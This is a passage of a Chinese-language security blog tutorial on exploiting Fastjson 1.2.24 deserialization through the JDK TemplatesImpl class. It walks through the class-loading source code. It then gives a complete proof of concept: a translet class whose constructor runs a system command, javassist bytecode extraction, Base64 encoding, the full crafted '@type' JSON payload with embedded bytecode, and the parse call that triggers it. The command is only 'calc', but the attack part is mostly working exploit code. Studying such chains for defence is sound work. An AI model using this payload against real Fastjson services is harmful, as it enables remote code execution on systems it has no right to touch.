</span></span><span style=display:flex><span>        _class <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[</span>classCount<span style=color:#ff79c6>]</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 判断 Class 数量长度大于1就初始化一个容器用于存放 Class，对我们来说没啥用，可以忽略</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (classCount <span style=color:#ff79c6>&gt;</span> 1) {
</span></span><span style=display:flex><span>            _auxClasses <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Hashtable();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> (<span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0; i <span style=color:#ff79c6>&lt;</span> classCount; i<span style=color:#ff79c6>++</span>) {
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 使用类加载器将字节数组加载为 Class</span>
</span></span><span style=display:flex><span>            _class<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> loader.<span style=color:#50fa7b>defineClass</span>(_bytecodes<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span>);
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 获取其父类 Class</span>
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>final</span> Class superClass <span style=color:#ff79c6>=</span> _class<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span>.<span style=color:#50fa7b>getSuperclass</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#6272a4>// 判断当前 Class 的父类 Class 名称是否为 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> (superClass.<span style=color:#50fa7b>getName</span>().<span style=color:#50fa7b>equals</span>(ABSTRACT_TRANSLET)) {
</span></span><span style=display:flex><span>                <span style=color:#6272a4>// 赋值 translet Class 在数组中的下标</span>
</span></span><span style=display:flex><span>                _transletIndex <span style=color:#ff79c6>=</span> i;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>else</span> {
</span></span><span style=display:flex><span>                <span style=color:#6272a4>// 存储 Class 名称及 Class，对我们来说没啥用，可以忽略</span>
</span></span><span style=display:flex><span>                _auxClasses.<span style=color:#50fa7b>put</span>(_class<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span>.<span style=color:#50fa7b>getName</span>(), _class<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (_transletIndex <span style=color:#ff79c6>&lt;</span> 0) {
</span></span><span style=display:flex><span>            ErrorMsg err<span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ErrorMsg(ErrorMsg.<span style=color:#50fa7b>NO_MAIN_TRANSLET_ERR</span>, _name);
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> TransformerConfigurationException(err.<span style=color:#50fa7b>toString</span>());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>catch</span> (ClassFormatError e) {
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ErrorMsg(ErrorMsg.<span style=color:#50fa7b>TRANSLET_CLASS_ERR</span>, _name);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> TransformerConfigurationException(err.<span style=color:#50fa7b>toString</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>catch</span> (LinkageError e) {
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ErrorMsg(ErrorMsg.<span style=color:#50fa7b>TRANSLET_OBJECT_ERR</span>, _name);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> TransformerConfigurationException(err.<span style=color:#50fa7b>toString</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>到目前为止，基本的利用链我们已经搞清楚了，先让 Fastjson 在反序列化的时候将 <code>TemplatesImpl</code> 的几个关键成员变量赋值，如将 <code>_bytecodes</code> 字段赋值为我们事先准备好的字节数组，这样在 Fastjson 调用 <code>getTransletInstance</code> 的时候会接着调用 <code>defineTransletClasses</code> 方法将字节数组使用类加载器加载对 Class，完成之后会再找到 class 数组 <code>_class</code> 中 <code>AbstractTranslet</code> 的子类 Class 使用反射调用无参构造方法创建对象，而这个对象是我们可以控制的，在其构造方法中添加任意代码完成利用。</p><p>但是还有三个问题：</p><ol><li>如何将 Java Class 文件转换为字节？</li><li>如何将 Java Class 字节序列化为 Fastjson 可以识别的 JSON 内容？</li><li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 中我们需要操作的那几个成员变量都是以下划线为开头的，并且只有 get 方法没有 set 方法，Fastjson 要如何进行反序列化？</li></ol><p>第一个问题我们可以直接使用 IO 流将 Java Class 文件读取到字节数组中，但这样太过粗暴且不利于移植，因此我们可以使用操作 Java 字节码库 <code>javassist</code> 来获取 Class 字节数组。</p><p>第二个问题需要我们将 Class 字节数组进行 Base64 编码，Fastjson 在反序列化的时候会自动进行解码。</p><p>第三个问题需要我们在反序列化JSON字符串时指定 Fastjson 支持没有 set 方法的成员变量，因此也注定了此种方式可利用范围较小。</p><h2 id=测试>测试</h2><p>在 pom.xml 中增加 <code>javassist</code> 依赖。</p><pre tabindex=0><code>&lt;dependency&gt;
    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
    &lt;version&gt;3.28.0-GA&lt;/version&gt;
&lt;/dependency&gt;
</code></pre><p>编写测试代码：</p><pre tabindex=0><code>import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.IOException;
import java.util.Base64;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;

public class Eval2 {

    public static class EvalTransletClass extends AbstractTranslet {
        public EvalTransletClass() throws IOException {
            Runtime.getRuntime().exec(&#34;calc&#34;);
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }
    }

    public static void main(String[] args) throws Exception {
        // 读取编译后的 class 文件为字节数组
        ClassPool classPool = ClassPool.getDefault();
        final CtClass ctClass = classPool.get(EvalTransletClass.class.getName());
        final byte[] bytes = ctClass.toBytecode();

        // 将 class 字节数组编码为 base64
        final String byteCode = Base64.getEncoder().encodeToString(bytes);

        // 构造 POC，这里使用 LinkedHashMap 是因为要保证顺序，@type 要放到第一位
        final Map&lt;String, Object&gt; pocMap = new LinkedHashMap&lt;&gt;();
        pocMap.put(&#34;@type&#34;, &#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;);
        pocMap.put(&#34;_bytecodes&#34;, Collections.singletonList(byteCode));
        pocMap.put(&#34;_name&#34;, &#34;守法市民小杜&#34;);
        pocMap.put(&#34;_outputProperties&#34;, new Object());
        pocMap.put(&#34;_tfactory&#34;, new Object());

        final String poc = JSON.toJSONString(pocMap);
        System.out.println(&#34;POC JSON:&#34;+poc);
        // POC JSON:{&#34;@type&#34;:&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;,&#34;_bytecodes&#34;:[&#34;yv66vgAAADQAMQoABgAhCgAiACMIACQKACIAJQcAJwcAKAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQARRXZhbFRyYW5zbGV0Q2xhc3MBAAxJbm5lckNsYXNzZXMBADJMY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzOwEACkV4Y2VwdGlvbnMHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAqAQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEACkV2YWwyLmphdmEMAAcACAcAKwwALAAtAQAEY2FsYwwALgAvBwAwAQAwY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAeY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAFgAEABcADQAYAAsAAAAMAAEAAAAOAAwADwAAABAAAAAEAAEAEQABABIAEwADAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAHQALAAAAIAADAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABYAFwACABAAAAAEAAEAGAAZAAAACQIAFAAAABYAAAABABIAGgADAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAIgALAAAAKgAEAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAQAAAABAABABgAGQAAAA0DABQAAAAbAAAAHQAAAAIAHwAAAAIAIAAOAAAACgABAAUAJgANAAk=&#34;],&#34;_name&#34;:&#34;守法市民小杜&#34;,&#34;_outputProperties&#34;:{}}

        // 反序列化为 Java 对象
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
</code></pre><p>运行之后将会看到弹出了计算器。</p><h2 id=注>注</h2><p>文中测试使用系统和工具版本如下：</p><ul><li><strong>操作系统</strong> windows 10 20H2</li><li><strong>jdk</strong> java 1.8.0_301</li><li><strong>fastjson</strong> 1.2.24</li><li><strong>javassist</strong> 3.28.0-GA</li><li><strong>代码仓库</strong> <a href=https://github.com/dushixiang/java-serialization-vulnerability>https://github.com/dushixiang/java-serialization-vulnerability</a></li></ul><h2 id=其他>其他</h2><p>此种方式可利用范围较小，但在高版本JDK上依然可以利用成功。</p><p>常见的 Fastjson 漏洞利用还有 RMI/JNDI 和 LDAP，但在高版本的JDK中，Java官方觉得请求远程地址上的类是一个很危险的操作，所以在最新的JDK中默认关闭了这个功能，我们在后面也会详细介绍。</p></article></div></main></body></html>